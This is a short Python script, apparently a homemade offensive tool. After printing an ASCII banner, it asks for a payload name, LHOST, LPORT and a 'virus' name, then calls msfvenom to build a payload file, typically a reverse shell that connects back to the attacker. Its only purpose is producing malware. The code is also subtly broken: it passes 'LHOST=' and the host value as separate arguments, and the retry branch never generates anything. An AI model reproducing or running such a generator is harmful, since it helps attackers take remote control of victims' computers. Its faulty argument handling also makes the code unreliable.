import subprocess
import time
from termcolor import colored

print (colored("_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-","red"))
print("╏       ◍◍◍◍ ","      ◍◍◍◍   ","◍◍◍     ◍◍◍        ╏")
print("╏       ◍◍  ◍◍ ","  ◍◍    ◍◍ ","  ◍◍◍  ◍◍◍         ╏")
print("╏       ◍◍  ◍◍ ","  ◍◍    ◍◍ ","    ◍◍◍◍           ╏")
print("╏       ◍◍  ◍◍ ","  ◍◍    ◍◍ ","    ◍◍◍◍           ╏")
print("╏       ◍◍  ◍◍ ","  ◍◍    ◍◍ ","  ◍◍◍  ◍◍◍         ╏")
print("╏       ◍◍◍◍ ","      ◍◍◍◍   ","◍◍◍      ◍◍◍       ╏")
print (colored("_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-","red"))
a =input(colored("[+]Name of payload :","green"))
b=input(colored("[+]give LHOST:","green"))
c=input(colored("[+]give LPORT:","green"))
d=input (colored("[+]given a name to virus:","green"))
e=int(input(colored("The given detail is correct press 1 otherwise press 0 to back:","cyan")))

if(e==1):
   subprocess.call(["msfvenom","-p",a,"LHOST=",b,"LPORT=",c,"-o",d])
else:
       a =input(colored("[+]Name of payload :","green"))
       b=input(colored("[+]give LHOST:","green"))
       c=input(colored("[+]give LPORT:","green"))
       d=input (colored("[+]given a name to virus:","green"))
       e=int(input(colored("The given detail is correct press 1 otherwise press 0 to back:","cyan")))
       
